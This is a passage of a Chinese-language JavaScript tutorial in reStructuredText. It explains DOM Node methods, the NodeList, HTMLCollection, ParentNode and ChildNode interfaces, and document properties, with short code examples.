      document.body.appendChild(test);
      test.isConnected // true

   上面代码中， ``test`` 节点是脚本生成的节点，没有插入文档之前， ``isConnected`` 属性返回 ``false`` ，插入之后返回 ``true`` 。

方法
---


Node.prototype.appendChild()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``appendChild()`` 方法接受一个节点对象作为参数，将其作为最后一个子节点，插入当前节点。该方法的返回值就是插入文档的子节点。

   .. code:: javascript

      var p = document.createElement('p');
      document.body.appendChild(p);

   上面代码新建一个 ``<p>`` 节点，将其插入 ``document.body`` 的尾部。

   如果参数节点是 DOM 已经存在的节点， ``appendChild()`` 方法会将其从原来的位置，移动到新位置。

   .. code:: javascript

      var div = document.getElementById('myDiv');
      document.body.appendChild(div);

   上面代码中，插入的是一个已经存在的节点 ``myDiv`` ，结果就是该节点会从原来的位置，移动到 ``document.body`` 的尾部。

   如果 ``appendChild()`` 方法的参数是 ``DocumentFragment`` 节点，那么插入的是 ``DocumentFragment`` 的所有子节点，而不是 ``DocumentFragment`` 节点本身。返回值是一个空的 ``DocumentFragment`` 节点。

Node.prototype.hasChildNodes()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``hasChildNodes`` 方法返回一个布尔值，表示当前节点是否有子节点。

   .. code:: javascript

      var foo = document.getElementById('foo');
   
      if (foo.hasChildNodes()) {
        foo.removeChild(foo.childNodes[0]);
      }

   上面代码表示，如果 ``foo`` 节点有子节点，就移除第一个子节点。

   注意，子节点包括所有类型的节点，并不仅仅是元素节点。哪怕节点只包含一个空格， ``hasChildNodes`` 方法也会返回 ``true`` 。

   判断一个节点有没有子节点，有许多种方法，下面是其中的三种。

   -  ``node.hasChildNodes()`` 
   -  ``node.firstChild !== null`` 
   -  ``node.childNodes && node.childNodes.length > 0`` 

    ``hasChildNodes`` 方法结合 ``firstChild`` 属性和 ``nextSibling`` 属性，可以遍历当前节点的所有后代节点。

   .. code:: javascript

      function DOMComb(parent, callback) {
        if (parent.hasChildNodes()) {
          for (var node = parent.firstChild; node; node = node.nextSibling) {
            DOMComb(node, callback);
          }
        }
        callback(parent);
      }
   
      // 用法
      DOMComb(document.body, console.log)

   上面代码中， ``DOMComb`` 函数的第一个参数是某个指定的节点，第二个参数是回调函数。这个回调函数会依次作用于指定节点，以及指定节点的所有后代节点。

Node.prototype.cloneNode()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``cloneNode`` 方法用于克隆一个节点。它接受一个布尔值作为参数，表示是否同时克隆子节点。它的返回值是一个克隆出来的新节点。

   .. code:: javascript

      var cloneUL = document.querySelector('ul').cloneNode(true);

   该方法有一些使用注意点。

   （1）克隆一个节点，会拷贝该节点的所有属性，但是会丧失 ``addEventListener`` 方法和 ``on-`` 属性（即 ``node.onclick = fn`` ），添加在这个节点上的事件回调函数。

   （2）该方法返回的节点不在文档之中，即没有任何父节点，必须使用诸如 ``Node.appendChild`` 这样的方法添加到文档之中。

   （3）克隆一个节点之后，DOM 有可能出现两个有相同 ``id`` 属性（即 ``id="xxx"`` ）的网页元素，这时应该修改其中一个元素的 ``id`` 属性。如果原节点有 ``name`` 属性，可能也需要修改。

Node.prototype.insertBefore()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``insertBefore`` 方法用于将某个节点插入父节点内部的指定位置。

   .. code:: javascript

      var insertedNode = parentNode.insertBefore(newNode, referenceNode);

    ``insertBefore`` 方法接受两个参数，第一个参数是所要插入的节点 ``newNode`` ，第二个参数是父节点 ``parentNode`` 内部的一个子节点 ``referenceNode`` 。 ``newNode`` 将插在 ``referenceNode`` 这个子节点的前面。返回值是插入的新节点 ``newNode`` 。

   .. code:: javascript

      var p = document.createElement('p');
      document.body.insertBefore(p, document.body.firstChild);

   上面代码中，新建一个 ``<p>`` 节点，插在 ``document.body.firstChild`` 的前面，也就是成为 ``document.body`` 的第一个子节点。

   如果 ``insertBefore`` 方法的第二个参数为 ``null`` ，则新节点将插在当前节点内部的最后位置，即变成最后一个子节点。

   .. code:: javascript

      var p = document.createElement('p');
      document.body.insertBefore(p, null);

   上面代码中， ``p`` 将成为 ``document.body`` 的最后一个子节点。这也说明 ``insertBefore`` 的第二个参数不能省略。

   注意，如果所要插入的节点是当前 DOM 现有的节点，则该节点将从原有的位置移除，插入新的位置。

   由于不存在 ``insertAfter`` 方法，如果新节点要插在父节点的某个子节点后面，可以用 ``insertBefore`` 方法结合 ``nextSibling`` 属性模拟。

   .. code:: javascript

      parent.insertBefore(s1, s2.nextSibling);

   上面代码中， ``parent`` 是父节点， ``s1`` 是一个全新的节点， ``s2`` 是可以将 ``s1`` 节点，插在 ``s2`` 节点的后面。如果 ``s2`` 是当前节点的最后一个子节点，则 ``s2.nextSibling`` 返回 ``null`` ，这时 ``s1`` 节点会插在当前节点的最后，变成当前节点的最后一个子节点，等于紧跟在 ``s2`` 的后面。

   如果要插入的节点是 ``DocumentFragment`` 类型，那么插入的将是 ``DocumentFragment`` 的所有子节点，而不是 ``DocumentFragment`` 节点本身。返回值将是一个空的 ``DocumentFragment`` 节点。

Node.prototype.removeChild()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``removeChild`` 方法接受一个子节点作为参数，用于从当前节点移除该子节点。返回值是移除的子节点。

   .. code:: javascript

      var divA = document.getElementById('A');
      divA.parentNode.removeChild(divA);

   上面代码移除了 ``divA`` 节点。注意，这个方法是在 ``divA`` 的父节点上调用的，不是在 ``divA`` 上调用的。

   下面是如何移除当前节点的所有子节点。

   .. code:: javascript

      var element = document.getElementById('top');
      while (element.firstChild) {
        element.removeChild(element.firstChild);
      }

   被移除的节点依然存在于内存之中，但不再是 DOM 的一部分。所以，一个节点移除以后，依然可以使用它，比如插入到另一个节点下面。

   如果参数节点不是当前节点的子节点， ``removeChild`` 方法将报错。

Node.prototype.replaceChild()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``replaceChild`` 方法用于将一个新的节点，替换当前节点的某一个子节点。

   .. code:: javascript

      var replacedNode = parentNode.replaceChild(newChild, oldChild);

   上面代码中， ``replaceChild`` 方法接受两个参数，第一个参数 ``newChild`` 是用来替换的新节点，第二个参数 ``oldChild`` 是将要替换走的子节点。返回值是替换走的那个节点 ``oldChild`` 。

   .. code:: javascript

      var divA = document.getElementById('divA');
      var newSpan = document.createElement('span');
      newSpan.textContent = 'Hello World!';
      divA.parentNode.replaceChild(newSpan, divA);

   上面代码是如何将指定节点 ``divA`` 替换走。

Node.prototype.contains()
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``contains`` 方法返回一个布尔值，表示参数节点是否满足以下三个条件之一。

   - 参数节点为当前节点。
   - 参数节点为当前节点的子节点。
   - 参数节点为当前节点的后代节点。

   .. code:: javascript

      document.body.contains(node)

   上面代码检查参数节点 ``node`` ，是否包含在当前文档之中。

   注意，当前节点传入 ``contains`` 方法，返回 ``true`` 。

   .. code:: javascript

      nodeA.contains(nodeA) // true

Node.prototype.compareDocumentPosition()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``compareDocumentPosition`` 方法的用法，与 ``contains`` 方法完全一致，返回一个六个比特位的二进制值，表示参数节点与当前节点的关系。

   二进制值 | 十进制值 | 含义
   ---------|------|-----
   000000 | 0 | 两个节点相同
   000001 | 1 | 两个节点不在同一个文档（即有一个节点不在当前文档）
   000010 | 2 | 参数节点在当前节点的前面
   000100 | 4 | 参数节点在当前节点的后面
   001000 | 8 | 参数节点包含当前节点
   010000 | 16 | 当前节点包含参数节点
   100000 | 32 | 浏览器内部使用

   .. code:: javascript

      // HTML 代码如下
      // <div id="mydiv">
      //   <form><input id="test" /></form>
      // </div>
   
      var div = document.getElementById('mydiv');
      var input = document.getElementById('test');
   
      div.compareDocumentPosition(input) // 20
      input.compareDocumentPosition(div) // 10

   上面代码中，节点 ``div`` 包含节点 ``input`` （二进制 ``010000`` ），而且节点 ``input`` 在节点 ``div`` 的后面（二进制 ``000100`` ），所以第一个 ``compareDocumentPosition`` 方法返回 ``20`` （二进制 ``010100`` ，即 ``010000 + 000100`` ），第二个 ``compareDocumentPosition`` 方法返回 ``10`` （二进制 ``001010`` ）。

   由于 ``compareDocumentPosition`` 返回值的含义，定义在每一个比特位上，所以如果要检查某一种特定的含义，就需要使用比特位运算符。

   .. code:: javascript

      var head = document.head;
      var body = document.body;
      if (head.compareDocumentPosition(body) & 4) {
        console.log('文档结构正确');
      } else {
        console.log('<body> 不能在 <head> 前面');
      }

   上面代码中， ``compareDocumentPosition`` 的返回值与 ``4`` （又称掩码）进行与运算（ ``&`` ），得到一个布尔值，表示 ``<head>`` 是否在 ``<body>`` 前面。

Node.prototype.isEqualNode()，Node.prototype.isSameNode()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``isEqualNode`` 方法返回一个布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。

   .. code:: javascript

      var p1 = document.createElement('p');
      var p2 = document.createElement('p');
   
      p1.isEqualNode(p2) // true

    ``isSameNode`` 方法返回一个布尔值，表示两个节点是否为同一个节点。

   .. code:: javascript

      var p1 = document.createElement('p');
      var p2 = document.createElement('p');
   
      p1.isSameNode(p2) // false
      p1.isSameNode(p1) // true

Node.prototype.normalize()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``normalize`` 方法用于清理当前节点内部的所有文本节点（text）。它会去除空的文本节点，并且将毗邻的文本节点合并成一个，也就是说不存在空的文本节点，以及毗邻的文本节点。

   .. code:: javascript

      var wrapper = document.createElement('div');
   
      wrapper.appendChild(document.createTextNode('Part 1 '));
      wrapper.appendChild(document.createTextNode('Part 2 '));
   
      wrapper.childNodes.length // 2
      wrapper.normalize();
      wrapper.childNodes.length // 1

   上面代码使用 ``normalize`` 方法之前， ``wrapper`` 节点有两个毗邻的文本子节点。使用 ``normalize`` 方法之后，两个文本子节点被合并成一个。

   该方法是 ``Text.splitText`` 的逆方法，可以查看《Text 节点对象》一章，了解更多内容。

Node.prototype.getRootNode()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``getRootNode()`` 方法返回当前节点所在文档的根节点 ``document`` ，与 ``ownerDocument`` 属性的作用相同。

   .. code:: javascript

      document.body.firstChild.getRootNode() === document
      // true
      document.body.firstChild.getRootNode() === document.body.firstChild.ownerDocument
      // true

   该方法可用于 ``document`` 节点自身，这一点与 ``document.ownerDocument`` 不同。

   .. code:: javascript

      document.getRootNode() // document
      document.ownerDocument // null

/🟠 NodeList 接口，HTMLCollection 接口
=====================================

   节点都是单个对象，有时需要一种数据结构，能够容纳多个节点。DOM 提供两种节点集合，用于容纳多个节点： ``NodeList`` 和 ``HTMLCollection`` 。

   这两种集合都属于接口规范。许多 DOM 属性和方法，返回的结果是 ``NodeList`` 实例或 ``HTMLCollection`` 实例。主要区别是， ``NodeList`` 可以包含各种类型的节点， ``HTMLCollection`` 只能包含 HTML 元素节点。

NodeList 接口
------------


概述
~~~

    ``NodeList`` 实例是一个类似数组的对象，它的成员是节点对象。通过以下方法可以得到 ``NodeList`` 实例。

   -  ``Node.childNodes`` 
   -  ``document.querySelectorAll()`` 等节点搜索方法

   .. code:: javascript

      document.body.childNodes instanceof NodeList // true

    ``NodeList`` 实例很像数组，可以使用 ``length`` 属性和 ``forEach`` 方法。但是，它不是数组，不能使用 ``pop`` 或 ``push`` 之类数组特有的方法。

   .. code:: javascript

      var children = document.body.childNodes;
   
      Array.isArray(children) // false
   
      children.length // 34
      children.forEach(console.log)

   上面代码中，NodeList 实例 ``children`` 不是数组，但是具有 ``length`` 属性和 ``forEach`` 方法。

   如果 ``NodeList`` 实例要使用数组方法，可以将其转为真正的数组。

   .. code:: javascript

      var children = document.body.childNodes;
      var nodeArr = Array.prototype.slice.call(children);

   除了使用 ``forEach`` 方法遍历 NodeList 实例，还可以使用 ``for`` 循环。

   .. code:: javascript

      var children = document.body.childNodes;
   
      for (var i = 0; i < children.length; i++) {
        var item = children[i];
      }

   注意，NodeList 实例可能是动态集合，也可能是静态集合。所谓动态集合就是一个活的集合，DOM 删除或新增一个相关节点，都会立刻反映在 NodeList 实例。目前，只有 ``Node.childNodes`` 返回的是一个动态集合，其他的 NodeList 都是静态集合。

   .. code:: javascript

      var children = document.body.childNodes;
      children.length // 18
      document.body.appendChild(document.createElement('p'));
      children.length // 19

   上面代码中，文档增加一个子节点，NodeList 实例 ``children`` 的 ``length`` 属性就增加了1。

NodeList.prototype.length
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``length`` 属性返回 NodeList 实例包含的节点数量。

   .. code:: javascript

      document.querySelectorAll('xxx').length
      // 0

   上面代码中， ``document.querySelectorAll`` 返回一个 NodeList 集合。对于那些不存在的 HTML 标签， ``length`` 属性返回 ``0`` 。

NodeList.prototype.forEach()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``forEach`` 方法用于遍历 NodeList 的所有成员。它接受一个回调函数作为参数，每一轮遍历就执行一次这个回调函数，用法与数组实例的 ``forEach`` 方法完全一致。

   .. code:: javascript

      var children = document.body.childNodes;
      children.forEach(function f(item, i, list) {
        // ...
      }, this);

   上面代码中，回调函数 ``f`` 的三个参数依次是当前成员、位置和当前 NodeList 实例。 ``forEach`` 方法的第二个参数，用于绑定回调函数内部的 ``this`` ，该参数可省略。

NodeList.prototype.item()
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``item`` 方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。

   .. code:: javascript

      document.body.childNodes.item(0)

   上面代码中， ``item(0)`` 返回第一个成员。

   如果参数值大于实际长度，或者索引不合法（比如负数）， ``item`` 方法返回 ``null`` 。如果省略参数， ``item`` 方法会报错。

   所有类似数组的对象，都可以使用方括号运算符取出成员。一般情况下，都是使用方括号运算符，而不使用 ``item`` 方法。

   .. code:: javascript

      document.body.childNodes[0]

NodeList.prototype.keys()，NodeList.prototype.values()，NodeList.prototype.entries()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

返回的遍历器同时包含键名和键值的信息。

   .. code:: javascript

      var children = document.body.childNodes;
   
      for (var key of children.keys()) {
        console.log(key);
      }
      // 0
      // 1
      // 2
      // ...
   
      for (var value of children.values()) {
        console.log(value);
      }
      // #text
      // <script>
      // ...
   
      for (var entry of children.entries()) {
        console.log(entry);
      }
      // Array [ 0, #text ]
      // Array [ 1, <script> ]
      // ...

HTMLCollection 接口
-------------------


概述
~~~

    ``HTMLCollection`` 是一个节点对象的集合，只能包含元素节点（element），不能包含其他类型的节点。它的返回值是一个类似数组的对象，但是与 ``NodeList`` 接口不同， ``HTMLCollection`` 没有 ``forEach`` 方法，只能使用 ``for`` 循环遍历。

   返回 ``HTMLCollection`` 实例的，主要是一些 ``Document`` 对象的集合属性，比如 ``document.links`` 、 ``document.forms`` 、 ``document.images`` 等。

   .. code:: javascript

      document.links instanceof HTMLCollection // true

    ``HTMLCollection`` 实例都是动态集合，节点的变化会实时反映在集合中。

   如果元素节点有 ``id`` 或 ``name`` 属性，那么 ``HTMLCollection`` 实例上面，可以使用 ``id`` 属性或 ``name`` 属性引用该节点元素。如果没有对应的节点，则返回 ``null`` 。

   .. code:: javascript

      // HTML 代码如下
      // <img id="pic" src="http://example.com/foo.jpg">
   
      var pic = document.getElementById('pic');
      document.images.pic === pic // true

   上面代码中， ``document.images`` 是一个 ``HTMLCollection`` 实例，可以通过 ``<img>`` 元素的 ``id`` 属性值，从 ``HTMLCollection`` 实例上取到这个元素。

HTMLCollection.prototype.length
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``length`` 属性返回 ``HTMLCollection`` 实例包含的成员数量。

   .. code:: javascript

      document.links.length // 18

HTMLCollection.prototype.item()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``item`` 方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。

   .. code:: javascript

      var c = document.images;
      var img0 = c.item(0);

   上面代码中， ``item(0)`` 表示返回0号位置的成员。由于方括号运算符也具有同样作用，而且使用更方便，所以一般情况下，总是使用方括号运算符。

   如果参数值超出成员数量或者不合法（比如小于0），那么 ``item`` 方法返回 ``null`` 。

HTMLCollection.prototype.namedItem()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``namedItem`` 方法的参数是一个字符串，表示 ``id`` 属性或 ``name`` 属性的值，返回当前集合中对应的元素节点。如果没有对应的节点，则返回 ``null`` 。

   .. code:: javascript

      // HTML 代码如下
      // <img id="pic" src="http://example.com/foo.jpg">
   
      var pic = document.getElementById('pic');
      document.images.namedItem('pic') === pic // true

    ``Collection.namedItem('value')`` 等同于 ``Collection['value']`` 。

/🟠 ParentNode 接口，ChildNode 接口
==================================

   节点对象除了继承 Node 接口以外，还拥有其他接口。 ``ParentNode`` 接口表示当前节点是一个父节点，提供一些处理子节点的方法。 ``ChildNode`` 接口表示当前节点是一个子节点，提供一些相关方法。

ParentNode 接口
--------------

   如果当前节点是父节点，就会混入了（mixin） ``ParentNode`` 接口。由于只有元素节点（element）、文档节点（document）和文档片段节点（documentFragment）拥有子节点，因此只有这三类节点会拥有 ``ParentNode`` 接口。

ParentNode.children
~~~~~~~~~~~~~~~~~~~~

    ``children`` 属性返回一个 ``HTMLCollection`` 实例，成员是当前节点的所有元素子节点。该属性只读。

   下面是遍历某个节点的所有元素子节点的示例。

   .. code:: javascript

      for (var i = 0; i < el.children.length; i++) {
        // ...
      }

   注意， ``children`` 属性只包括元素子节点，不包括其他类型的子节点（比如文本子节点）。如果没有元素类型的子节点，返回值 ``HTMLCollection`` 实例的 ``length`` 属性为 ``0`` 。

   另外， ``HTMLCollection`` 是动态集合，会实时反映 DOM 的任何变化。

ParentNode.firstElementChild
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``firstElementChild`` 属性返回当前节点的第一个元素子节点。如果没有任何元素子节点，则返回 ``null`` 。

   .. code:: javascript

      document.firstElementChild.nodeName
      // "HTML"

   上面代码中， ``document`` 节点的第一个元素子节点是 ``<HTML>`` 。

ParentNode.lastElementChild
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``lastElementChild`` 属性返回当前节点的最后一个元素子节点，如果不存在任何元素子节点，则返回 ``null`` 。

   .. code:: javascript

      document.lastElementChild.nodeName
      // "HTML"

   上面代码中， ``document`` 节点的最后一个元素子节点是 ``<HTML>`` （因为 ``document`` 只包含这一个元素子节点）。

ParentNode.childElementCount
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``childElementCount`` 属性返回一个整数，表示当前节点的所有元素子节点的数目。如果不包含任何元素子节点，则返回 ``0`` 。

   .. code:: javascript

      document.body.childElementCount // 13

ParentNode.append()，ParentNode.prepend()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   **（1）ParentNode.append()**

    ``append()`` 方法为当前节点追加一个或多个子节点，位置是最后一个元素子节点的后面。

   该方法不仅可以添加元素子节点（参数为元素节点），还可以添加文本子节点（参数为字符串）。

   .. code:: javascript

      var parent = document.body;
   
      // 添加元素子节点
      var p = document.createElement('p');
      parent.append(p);
   
      // 添加文本子节点
      parent.append('Hello');
   
      // 添加多个元素子节点
      var p1 = document.createElement('p');
      var p2 = document.createElement('p');
      parent.append(p1, p2);
   
      // 添加元素子节点和文本子节点
      var p = document.createElement('p');
      parent.append('Hello', p);

   该方法没有返回值。

   注意，该方法与 ``Node.prototype.appendChild()`` 方法有三点不同。

   -  ``append()`` 允许字符串作为参数， ``appendChild()`` 只允许子节点作为参数。
   -  ``append()`` 没有返回值，而 ``appendChild()`` 返回添加的子节点。
   -  ``append()`` 可以添加多个子节点和字符串（即允许多个参数）， ``appendChild()`` 只能添加一个节点（即只允许一个参数）。

   **（2）ParentNode.prepend()**

    ``prepend()`` 方法为当前节点追加一个或多个子节点，位置是第一个元素子节点的前面。它的用法与 ``append()`` 方法完全一致，也是没有返回值。

ChildNode 接口
--------------

   如果一个节点有父节点，那么该节点就拥有了 ``ChildNode`` 接口。

ChildNode.remove()
~~~~~~~~~~~~~~~~~~~

    ``remove()`` 方法用于从父节点移除当前节点。

   .. code:: javascript

      el.remove()

   上面代码在 DOM 里面移除了 ``el`` 节点。

ChildNode.before()，ChildNode.after()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   **（1）ChildNode.before()**

    ``before()`` 方法用于在当前节点的前面，插入一个或多个同级节点。两者拥有相同的父节点。

   注意，该方法不仅可以插入元素节点，还可以插入文本节点。

   .. code:: javascript

      var p = document.createElement('p');
      var p1 = document.createElement('p');
   
      // 插入元素节点
      el.before(p);
   
      // 插入文本节点
      el.before('Hello');
   
      // 插入多个元素节点
      el.before(p, p1);
   
      // 插入元素节点和文本节点
      el.before(p, 'Hello');

   **（2）ChildNode.after()**

    ``after()`` 方法用于在当前节点的后面，插入一个或多个同级节点，两者拥有相同的父节点。用法与 ``before`` 方法完全相同。

ChildNode.replaceWith()
~~~~~~~~~~~~~~~~~~~~~~~~

    ``replaceWith()`` 方法使用参数节点，替换当前节点。参数可以是元素节点，也可以是文本节点。

   .. code:: javascript

      var span = document.createElement('span');
      el.replaceWith(span);

   上面代码中， ``el`` 节点将被 ``span`` 节点替换。

/🟠 Document 节点
=================


概述
---

    ``document`` 节点对象代表整个文档，每张网页都有自己的 ``document`` 对象。 ``window.document`` 属性就指向这个对象。只要浏览器开始载入 HTML 文档，该对象就存在了，可以直接使用。

    ``document`` 对象有不同的办法可以获取。

   - 正常的网页，直接使用 ``document`` 或 ``window.document`` 。
   -  ``iframe`` 框架里面的网页，使用 ``iframe`` 节点的 ``contentDocument`` 属性。
   - Ajax 操作返回的文档，使用 ``XMLHttpRequest`` 对象的 ``responseXML`` 属性。
   - 内部节点的 ``ownerDocument`` 属性。

    ``document`` 对象继承了 ``EventTarget`` 接口和 ``Node`` 接口，并且混入（mixin）了 ``ParentNode`` 接口。这意味着，这些接口的方法都可以在 ``document`` 对象上调用。除此之外， ``document`` 对象还有很多自己的属性和方法。

属性
---


快捷方式属性
~~~~~~~~~~

   以下属性是指向文档内部的某个节点的快捷方式。

   **（1）document.defaultView**

    ``document.defaultView`` 属性返回 ``document`` 对象所属的 ``window`` 对象。如果当前文档不属于 ``window`` 对象，该属性返回 ``null`` 。

   .. code:: javascript

      document.defaultView === window // true

   **（2）document.doctype**

   对于 HTML 文档来说， ``document`` 对象一般有两个子节点。第一个子节点是 ``document.doctype`` ，指向 ``<DOCTYPE>`` 节点，即文档类型（Document Type Declaration，简写DTD）节点。HTML 的文档类型节点，一般写成 ``<!DOCTYPE html>`` 。如果网页没有声明 DTD，该属性返回 ``null`` 。

   .. code:: javascript

      var doctype = document.doctype;
      doctype // "<!DOCTYPE html>"
      doctype.name // "html"

    ``document.firstChild`` 通常就返回这个节点。

   **（3）document.documentElement**

    ``document.documentElement`` 属性返回当前文档的根元素节点（root）。它通常是 ``document`` 节点的第二个子节点，紧跟在 ``document.doctype`` 节点后面。HTML网页的该属性，一般是 ``<html>`` 节点。

   **（4）document.body，document.head**

    ``document.body`` 属性指向 ``<body>`` 节点， ``document.head`` 属性指向 ``<head>`` 节点。

   这两个属性总是存在的，如果网页源码里面省略了 ``<head>`` 或 ``<body>`` ，浏览器会自动创建。另外，这两个属性是可写的，如果改写它们的值，相当于移除所有子节点。

   **（5）document.scrollingElement**

    ``document.scrollingElement`` 属性返回文档的滚动元素。也就是说，当文档整体滚动时，到底是哪个元素在滚动。

   标准模式下，这个属性返回的文档的根元素 ``document.documentElement`` （即 ``<html>`` ）。兼容（quirk）模式下，返回的是 ``<body>`` 元素，如果该元素不存在，返回 ``null`` 。

   .. code:: javascript

      // 页面滚动到浏览器顶部
      document.scrollingElement.scrollTop = 0;

   **（6）document.activeElement**

    ``document.activeElement`` 属性返回获得当前焦点（focus）的 DOM 元素。通常，这个属性返回的是 ``<input>`` 、 ``<textarea>`` 、 ``<select>`` 等表单元素，如果当前没有焦点元素，返回 ``<body>`` 元素或 ``null`` 。

   **（7）document.fullscreenElement**

    ``document.fullscreenElement`` 属性返回当前以全屏状态展示的 DOM 元素。如果不是全屏状态，该属性返回 ``null`` 。

   .. code:: javascript

      if (
        document.fullscreenElement && 
        document.fullscreenElement.nodeName == 'VIDEO'
      ) {
        console.log('全屏播放视频');
      }

   上面代码中，通过 ``document.fullscreenElement`` 可以知道 ``<video>`` 元素有没有处在全屏状态，从而判断用户行为。

节点集合属性
~~~~~~~~~~

   以下属性返回一个 ``HTMLCollection`` 实例，表示文档内部特定元素的集合。这些集合都是动态的，原节点有任何变化，立刻会反映在集合中。

   **（1）document.links**

    ``document.links`` 属性返回当前文档所有设定了 ``href`` 属性的 ``<a>`` 及 ``<area>`` 节点。

   .. code:: javascript

      // 打印文档所有的链接
      var links = document.links;
      for(var i = 0; i < links.length; i++) {
        console.log(links[i]);
      }

   **（2）document.forms**

    ``document.forms`` 属性返回所有 ``<form>`` 表单节点。

   .. code:: javascript

      var selectForm = document.forms[0];

   上面代码获取文档第一个表单。

   除了使用位置序号， ``id`` 属性和 ``name`` 属性也可以用来引用表单。

   .. code:: javascript

      /* HTML 代码如下
        <form name="foo" id="bar"></form>
      */
      document.forms[0] === document.forms.foo // true
      document.forms.bar === document.forms.foo // true

   **（3）document.images**

    ``document.images`` 属性返回页面所有 ``<img>`` 图片节点。

   .. code:: javascript

      var imglist = document.images;
   
      for(var i = 0; i < imglist.length; i++) {
        if (imglist[i].src === 'banner.gif') {
          // ...
        }
      }

   上面代码在所有 ``img`` 标签中，寻找某张图片。

   **（4）document.embeds，document.plugins**

    ``document.embeds`` 属性和 ``document.plugins`` 属性，都返回所有 ``<embed>`` 节点。

   **（5）document.scripts**

    ``document.scripts`` 属性返回所有 ``<script>`` 节点。

   .. code:: javascript

      var scripts = document.scripts;
      if (scripts.length !== 0 ) {
        console.log('当前网页有脚本');
      }

   **（6）document.styleSheets**

    ``document.styleSheets`` 属性返回网页内嵌或引入的 CSS 样式表集合，详细介绍请看《CSS 操作》一章。

   **（7）小结**

   除了 ``document.styleSheets`` 属性，以上的其他集合属性返回的都是 ``HTMLCollection`` 实例。 ``document.styleSheets`` 属性返回的是 ``StyleSheetList`` 实例。

   .. code:: javascript

      document.links instanceof HTMLCollection // true
      document.images instanceof HTMLCollection // true
      document.forms instanceof HTMLCollection // true
      document.embeds instanceof HTMLCollection // true
      document.scripts instanceof HTMLCollection // true

    ``HTMLCollection`` 实例是类似数组的对象，所以上面这些属性都有 ``length`` 属性，都可以使用方括号运算符引用成员。如果成员有 ``id`` 或 ``name`` 属性，还可以用这两个属性的值，在 ``HTMLCollection`` 实例上引用到这个成员。

   .. code:: javascript

      // HTML 代码如下
      // <form name="myForm">
      document.myForm === document.forms.myForm // true

文档静态信息属性
~~~~~~~~~~~~~

   以下属性返回文档信息。

   **（1）document.documentURI，document.URL**

    ``document.documentURI`` 属性和 ``document.URL`` 属性都返回一个字符串，表示当前文档的网址。不同之处是它们继承自不同的接口， ``documentURI`` 继承自 ``Document`` 接口，可用于所有文档； ``URL`` 继承自 ``HTMLDocument`` 接口，只能用于 HTML 文档。

   .. code:: javascript

      document.URL
      // http://www.example.com/about
   
      document.documentURI === document.URL
      // true

   如果文档的锚点（ ``#anchor`` ）变化，这两个属性都会跟着变化。

   **（2）document.domain**

    ``document.domain`` 属性返回当前文档的域名，不包含协议和端口。比如，网页的网址是 ``http://www.example.com:80/hello.html`` ，那么 ``document.domain`` 属性就等于 ``www.example.com`` 。如果无法获取域名，该属性返回 ``null`` 。

    ``document.domain`` 基本上是一个只读属性，只有一种情况除外。次级域名的网页，可以把 ``document.domain`` 设为对应的上级域名。比如，当前域名是 ``a.sub.example.com`` ，则 ``document.domain`` 属性可以设置为 ``sub.example.com`` ，也可以设为 ``example.com`` 。修改后， ``document.domain`` 相同的两个网页，可以读取对方的资源，比如设置的 Cookie。

   另外，设置 ``document.domain`` 会导致端口被改成 ``null`` 。因此，如果通过设置 ``document.domain`` 来进行通信，双方网页都必须设置这个值，才能保证端口相同。

   **（3）document.location**

    ``Location`` 对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过 ``window.location`` 和 ``document.location`` 属性，可以拿到这个对象。

   关于这个对象的详细介绍，请看《浏览器模型》部分的《Location 对象》章节。

   **（4）document.lastModified**

    ``document.lastModified`` 属性返回一个字符串，表示当前文档最后修改的时间。不同浏览器的返回值，日期格式是不一样的。

   .. code:: javascript

      document.lastModified
      // "03/07/2018 11:18:27"

   注意， ``document.lastModified`` 属性的值是字符串，所以不能直接用来比较。 ``Date.parse`` 方法将其转为 ``Date`` 实例，才能比较两个网页。

   .. code:: javascript

      var lastVisitedDate = Date.parse('01/01/2018');
      if (Date.parse(document.lastModified) > lastVisitedDate) {
        console.log('网页已经变更');
      }

   如果页面上有 JavaScript 生成的内容， ``document.lastModified`` 属性返回的总是当前时间。

   **（5）document.title**

    ``document.title`` 属性返回当前文档的标题。默认情况下，返回 ``<title>`` 节点的值。但是该属性是可写的，一旦被修改，就返回修改后的值。

   .. code:: javascript

      document.title = '新标题';
      document.title // "新标题"

   **（6）document.characterSet**

    ``document.characterSet`` 属性返回当前文档的编码，比如 ``UTF-8`` 、 ``ISO-8859-1`` 等等。

   **（7）document.referrer**

    ``document.referrer`` 属性返回一个字符串，表示当前文档的访问者来自哪里。

   .. code:: javascript

      document.referrer
      // "https://example.com/path"

   如果无法获取来源，或者用户直接键入网址而不是从其他网页点击进入， ``document.referrer`` 返回一个空字符串。

